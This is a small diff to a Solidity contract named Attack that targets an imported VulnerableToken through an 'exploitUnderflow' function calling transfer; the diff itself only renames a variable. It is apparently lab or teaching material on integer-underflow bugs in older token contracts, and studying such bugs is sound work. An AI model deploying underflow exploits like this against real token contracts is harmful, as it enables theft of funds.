@@ -4,14 +4,14 @@ pragma solidity ^0.7.0;
 import "./VulnerableToken.sol";
 
 contract Attack {
-    VulnerableToken public vulnerableToken;
+    VulnerableToken public token;
 
     constructor(address _vulnerableTokenAddress) {
-        vulnerableToken = VulnerableToken(_vulnerableTokenAddress);
+        token = VulnerableToken(_vulnerableTokenAddress);
     }
 
     // Perform underflow attack
     function exploitUnderflow() public {
-        vulnerableToken.transfer(msg.sender, 10); // ⚡ Try sending 10 token
+        token.transfer(msg.sender, 10); // ⚡ Try sending 10 token
     }
 }
